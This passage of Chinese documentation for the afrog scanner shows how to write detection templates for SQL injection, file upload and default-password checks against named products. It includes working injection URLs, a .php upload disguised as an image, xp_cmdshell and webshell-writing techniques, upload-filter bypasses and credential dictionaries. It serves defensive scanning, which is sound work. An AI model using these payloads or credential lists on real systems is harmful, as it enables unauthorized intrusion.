`UNION SELECT` 把查询结果塞进页面原本要展示的字段里。内置 PoC `zbintel-erp-getpersonalsealdata-sqli` 直接取数据库版本：

```yaml
    path: /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--
    expression: |
      response.status == 200 &&
      response.body.ibcontains(b"Microsoft SQL Server") &&
      response.body.ibcontains(b'"SealData":') &&
      response.body.ibcontains(b'"Image":')
```

要点：决定性的锚点是**查询结果本身**（`@@version` 返回的版本串），后两个业务字段只用来确认「响应的确是那个正常接口」。只判业务字段的话，任何正常响应都会命中。同类锚点还有 `user()`、`database()`、`@@datadir`。

### 注入 → 进一步利用

SQL 注入经常只是入口，后面接写文件或命令执行，这两条路都能复用前面章节的结论：

- **写 webshell 再回读**：内置 PoC `realor-getbsappurl-sqli` 用 `select ... into outfile` 落地一个随机文件名的 php，再用第二条规则访问 `/{{randstr}}.php` 校验 phpinfo 特征——与命令执行类的「写入型」完全同构
- **`xp_cmdshell` 执行命令**：内置 PoC `yonyou-grp-u8-sqli-to-rce` 在 `exec xp_cmdshell` 里执行 `set/A {{r1}}*{{r2}}`，判定响应里是否出现乘积——与命令执行类的「算术证明」同一手法

### 本类降误报要点

1. 锚点必须是「只有注入成功才可能出现」的东西：随机值、版本号格式、`XPATH syntax error:` 这类报错关键字
2. 不要只判 `response.status == 200`，也不要用页面原有的业务字段
3. 报错注入的回显有长度上限，长随机值要截断后匹配（如 `substr(md5(...), 0, 31)`）
4. 时间盲注要证明的是「耗时随注入的延时值变化」（交替两个延时值），而不是单次是否落在某个区间；区间还要确认下界小于上界
5. 布尔盲注要成对出现：同一参数分别构造 true / false 两种输入，比较差异
6. 优先用报错注入或联合查询（1 次请求）；盲注只在无回显时才用，因为它必然要多发请求

## 文件上传类 (File Upload)

### 命名与检索

命名通行做法是文件名与 `id` 以 `-fileupload` 结尾；也见 `-upload`、`-uploadfile`、`-file-upload`、`-anyfile-upload` 等变体。`tags` 里带上 `fileupload`（也见 `upload`、`uploadfile`、`anyfile`）。

内置语料里这一类主要落在 `afrog-pocs/vulnerability/`，另有部分在 `CNVD/` 下。

```bash
afrog -t https://example.com -s fileupload
```

### 先分流：怎么证明「文件真的传上去了」

上传接口返回成功，**不等于**文件真的落地了，更不等于能访问。三种确认方式的确凿程度和成本都不同：

| 方式 | 证据 | 请求数 |
| --- | --- | --- |
| 上传 + 回读 | 访问上传后的路径，校验写入的内容 | 2 |
| 只认上传响应 | 响应里明确返回了服务端落地的文件名或路径 | 1 |
| 上传后就地触发 | 访问上传的脚本拿到预期回显 | 2 |

优先选前两种：它们只证明「能写入文件」，不涉及真实执行，风险最低。第三种留给你确实需要验证「能执行」的场景。

### 手法一：上传 + 回读

最确凿的写法。内置 PoC `vesystem-fileupload`：

```yaml
id: vesystem-fileupload

info:
  name: 和信云桌面未授权任意文件上传
  severity: critical
  author: 数星星
  verified: true
  tags: vesystem,fileupload,unauth
  created: 2025/03/13

set:
  r1: randomInt(10000, 99999)
  r2: randomLowercase(32)
  md5str: md5(r2)
  rboundary: randomLowercase(8)

rules:
  r0:
    request:
      method: POST
      path: /Upload/upload_file.php?l=test
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{r1}}.php"
        Content-Type: image/avif

        {{md5str}}
        ------WebKitFormBoundary{{rboundary}}--
    expression: response.status == 200 && response.body.bcontains(b'_Requst:<br>')
  r1:
    request:
      method: GET
      path: /Upload/test/{{r1}}.php
    expression: response.status == 200 && response.body.bcontains(bytes(md5str))
expression: r0() && r1()
```

要点：

- **写入的内容是随机值的 md5**（`{{md5str}}`），不是可执行代码。回读到这个串，就证明「服务端确实按我指定的扩展名落盘、且内容可控」，不需要真的写一句话木马
- **文件名随机**（`{{r1}}`）：避免互相覆盖，回读时也能确认取到的是自己传的那份
- **判定分两步且分工明确**：`r0` 证明上传接口受理了（`b'_Requst:<br>'` 是该接口的返回特征），`r1` 证明文件能访问且内容对得上。顶层 `r0() && r1()`
- **`boundary` 两处必须一致，结尾必须有 `--<boundary>--`**：头部 `Content-Type` 里的 boundary 值要和 body 里每一处分隔符完全相同，最后一行要是 `--<boundary>--`
- **`Content-Type: image/avif` 是伪装**：文件名给 `.php`、类型声称是图片，用来绕过只看类型的校验

**关于换行：不用再手写 `\r\n`。** body 直接按普通多行写就行。当 `Content-Type` 以 `multipart/` 开头、且 body 里是纯换行（不含 `\r\n`）时，`afrog` 会自动把每个换行转成 CRLF，并在结尾补一个 CRLF——所以示例里用的是普通的 `body: |`，而不是旧写法那种 `"\` + `\r\n\` 的折行拼接。

> 注意头部名要按原样写作 `Content-Type`：这个判断是按该键名去取头的，写成 `content-type` 就不会触发自动转换。

### 手法二：只认上传响应，一次请求

如果上传接口会把服务端落地的文件名回吐出来，就不必再回读。内置 PoC `flink-upload-rce` 只发一次请求：

```yaml
      body: |
        --WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="jarfile"; filename="{{r2}}.jar"
        Content-Type: application/octet-stream

        {{randbody}}
        --WebKitFormBoundary{{rboundary}}--
      follow_redirects: true
    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"success") && response.body.bcontains(bytes('_'+r2+'.jar'))
expression: r0()
```

要点：

- 判定里带了 **`_<随机名>.jar`** —— 这是服务端返回的落地文件名。只判 `success` 是不够的，必须看到「自己那个随机文件名」出现在响应里
- 随机文件名（`{{r2}}`）在这里承担了「唯一标记」的作用，响应里出现它就说明这次上传确实被受理并落盘
- 需要跟随跳转时显式加 `follow_redirects: true`

### 服务端改了文件名怎么办

不少上传接口会重命名文件，这时访问路径不能写死，要从上传响应里**提取**出来。内置 PoC `showdoc-fileupload` 提取的是「日期 + 新文件名」：

```yaml
    output:
      search: '"(?P<date>\\d{4}-\\d{2}-\\d{2})\\\\/(?P<file>[a-f0-9]+\\.php)".bsubmatch(response.body)'
      date: search["date"]
      file: search["file"]
# 下一条规则：
    path: /Public/Uploads/{{date}}/{{file}}
```

内置 PoC `yonyou-u8-doupload-fileupload` 同理，只提取文件名：

```yaml
    output:
      search: '"\"(?P<jspname>.*?).jsp\";".bsubmatch(response.body)'
      jspname: search["jspname"]
# 下一条规则：
    path: /yyoa/portal/upload/{{jspname}}.jsp
```

要点：用命名的正则分组（`(?P<name>...)`）把需要的片段单独取出来，再拼进下一条规则的 `path`；取值后回读校验内容，一样不能省。

### 扩展名与 Content-Type 绕过

上传类漏洞的核心难点通常不在「发包」，而在「怎么让文件通过后缀与类型校验」。语料里出现的做法：

- **伪造 Content-Type**：文件名写 `.php`，`Content-Type` 写 `image/avif`、`text/plain` 或 `application/octet-stream`（上面三条 PoC 各用一种）
- **在文件名里插入特殊字符**：如 `{{r1}}.<>php`（`showdoc-fileupload` 就是这么绕过后缀黑名单的）

常见的绕过思路还有：`.phtml` / `.php5` / `.phar` / `.jsp` / `.jspx` 等可解析后缀、尾随点或空格（`.php.`、`.php `）、`%00` 截断、大小写混写。

但要注意：**这些都是绕过手段，不是判定依据**。判定始终要落在「文件能不能被访问到、内容对不对」上，否则换个被过滤的目标就会误报。

### 本类降误报要点

1. 只看到上传接口返回成功（或 200）不算命中，必须回读到内容，或从响应里确认到服务端落地的文件名
2. 上传内容优先用随机值 / 随机值的哈希，不要真的写入可执行代码
3. 手写 multipart 时，`boundary` 必须两处一致、结尾必须有 `--<boundary>--`；换行交给 afrog 自动转换，不必手写 `\r\n`
4. 文件名要随机，避免互相覆盖，也让回读时能确认拿到的确实是自己那份
5. 上传后要清理：能写 `unlink(__FILE__)` 之类的自删逻辑更干净，但别把判定依赖在它上面

## 弱口令爆破类 (Weak Password Brute Force)

### 命名与检索

命名通行做法是文件名与 `id` 以 `-weak-login` 结尾；也见 `-default-login`、`-default-password`、`-default-pwd`、`-weak-password`、`-password` 等变体。`tags` 以 `default-login` 为主，也见 `weak-login`、`default-password`，协议类还会加上 `network`。

这一类是唯一拥有**独立目录**的类型，全部落在 `afrog-pocs/default-pwd/`。

因为 `default-login` 与 `weak-login` 两种 tags 并存，筛选时两个都要试：

```bash
afrog -t https://example.com -s default-login,weak-login
```

### 先分流：三类形态

| 形态 | 做法 | 请求数 |
| --- | --- | --- |
| HTTP · 就差几组默认口令 | 每组写一条规则，顶层 `\|\|` | 与口令组数相同 |
| HTTP · 要翻字典 | `brute` 枚举用户名 × 密码 | 笛卡尔积条数 |
| 网络协议（SSH/MySQL/Redis…） | `type: go` + 内置插件 + `requires` 门控 | 由插件决定 |

### 形态一：几组默认口令就够

多数资产类系统只有一两组众所周知的默认口令，直接写规则最省事。内置 PoC `grafana-default-password`：

```yaml
id: grafana-default-password

info:
  name: Grafana Default Password
  author: For3stCo1d
  severity: high
  verified: true
  tags: grafana,default-login

rules:
  r0:
    request:
      method: POST
      path: /login
      headers:
        Content-Type: application/json
      body: '{"user":"admin","password":"admin"}'
    expression: response.status == 200 && response.body.bcontains(b'"message":') && response.body.bcontains(b'"Logged in"') && response.raw_header.bcontains(b'grafana_session')
  r1:
    request:
      method: POST
      path: /login
      headers:
        Content-Type: application/json
      body: '{"user":"admin","password":"prom-operator"}'
    expression: response.status == 200 && response.body.bcontains(b'"message":') && response.body.bcontains(b'"Logged in"') && response.raw_header.bcontains(b'grafana_session')
expression: r0() || r1()
```

要点：

- 一组口令一条规则，顶层用 `||`——命中任意一组就说明存在弱口令
- **判定必须落在「认证成功」的证据上**：这里是 `"Logged in"` 消息加上 `grafana_session` 这个 cookie。只判 `status == 200` 会把登录页本身也算成命中
- 读 cookie 用 `response.raw_header`（原始响应头），而不是 `response.body`

内置 PoC `activemq-default-password` 是 Basic Auth 变体，差别在凭据要先编码、判定要看登录后的专属内容：

```yaml
set:
  admin: "base64('admin:admin')"
  user: "base64('user:user')"

rules:
  r0:
    request:
      method: GET
      path: /admin/
      headers:
        Authorization: Basic {{admin}}
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b"Welcome to the Apache ActiveMQ Console of") && 
      response.body.bcontains(b"<h2>Broker</h2>")
  r1:
    request:
      method: GET
      path: /admin/
      headers:
        Authorization: Basic {{user}}
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b"Welcome to the Apache ActiveMQ Console of") && 
      response.body.bcontains(b"<h2>Broker</h2>")
expression: r0() || r1()
```

### 形态二：要翻字典时用 `brute`

`mode` / `commit` / `continue` 的完整说明见 [brute 机制](./05-brute.md)，这里只讲弱口令场景特有的两点。内置 PoC `tomcat-weak-login`：

```yaml
  r1:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      username:
        - admin
        - tomcat
        - manager
        - role1
        - both
      password:
        - admin
        - tomcat
        - manager
        - s3cret
        - 123456
        - admin123
        - changeme
    request:
      method: GET
      path: "{{p}}"
      headers:
        Authorization: "Basic {{base64(username + ':' + password)}}"
    expression: |
      response.status == 200 &&
      response.headers["set-cookie"].contains("JSESSIONID") &&
      (
        response.body.bcontains(b"Tomcat Manager Application") ||
        response.body.bcontains(b"<title>/manager</title>") ||
        response.body.bcontains(b"manager-gui")
      )
```

要点：

- **可以在请求字段里对 brute 变量做编码**：`Authorization: "Basic {{base64(username + ':' + password)}}"`。Basic Auth 需要的是 `user:pass` 的 base64，这种「在模板里组合多个枚举变量再编码」的写法是本类的关键技巧
- **认证成功的标志是拿到会话**：判定里的 `response.headers["set-cookie"].contains("JSESSIONID")` 加上登录后页面特征。缺了会话判断，登录页也会命中
- **枚举结果可以跨规则复用**：这条 PoC 的 `r0` 先用 `brute` 枚举 manager 路径（含 `/..;/manager/html` 这类绕过），`r1` 再用 `{{p}}` 引用 `r0` 命中的路径。靠的是 `commit: winner` 把命中值提交成了变量
- **字典要小而准**：这里给的是「默认口令 + 高频弱口令」的并集（`admin`/`tomcat`/`s3cret`/`123456`…）。`continue: false` 只在命中之后省请求——**未命中的目标仍要把整张字典跑完**，所以字典越大，最常见情况的成本越高

### 形态三：网络协议用 `type: go`

SSH / FTP / MySQL / Redis 这类协议的爆破逻辑放在 Go 插件里，PoC 只负责判定和提取。内置 PoC `ssh-weak-login`：

```yaml
id: ssh-weak-login

info:
  name: SSH Weak Login
  author: zan8in
  severity: high
  verified: true
  tags: network,ssh,default-login,weak-login
  requires: [ssh]

rules:
  r0:
    request:
      type: go
      data: ssh-weak-login
    expression: response.raw.bcontains(b"success;")
    extractors:
      - type: regex
        extractor:
          ext: '"user=(?P<username>[^;]*);pass=(?P<password>.*)$".bsubmatch(response.raw)'
          username: ext["username"]
          password: ext["password"]
expression: r0()
```

要点：

- `type: go` + `data: <插件名>` 表示「请求交给内置 Go 插件执行」，`data` 里的名字与 `id` 一致
- **`requires: [ssh]` 门控尤其重要**：插件会在目标上跑一整张字典，先确认指纹是 SSH 再跑，否则对着一个 HTTP 端口白跑
- 插件把结果按固定格式回吐到 `response.raw`（这里是 `success;user=<用户名>;pass=<密码>`），所以 `expression` 判的是 `success;`
- 命中后用 `extractors` 从 `response.raw` 里把用户名和密码提取出来，报告里才能直接看到是哪组凭据
- 这一类的请求数由插件内部决定，PoC 层面控制不了——**门控是唯一的成本开关**

### 本类降误报要点

1. 判定必须是「认证成功」的证据：会话 cookie、登录后的专属内容、跳转后的新路径。状态码不可靠——登录失败也常见 200 或 302
2. 不要只判 `response.status == 200`，否则登录页本身就会命中
3. Basic Auth 场景记得先把凭据 `base64()` 编码
4. 协议类必须写 `requires` 门控，否则等于对任意端口盲跑字典
5. 字典要小而准：`continue: false` 只在命中后省请求，未命中的目标仍要跑完全部组合

> **← 上一篇：** [TCP / SSL](./08-tcp.md) ｜ **本手册首页：** [PoC 编写快速开始](./01-quickstart.md) ｜ **下一篇 →：** [PoC 贡献者荣誉墙](./10-contributors.md)
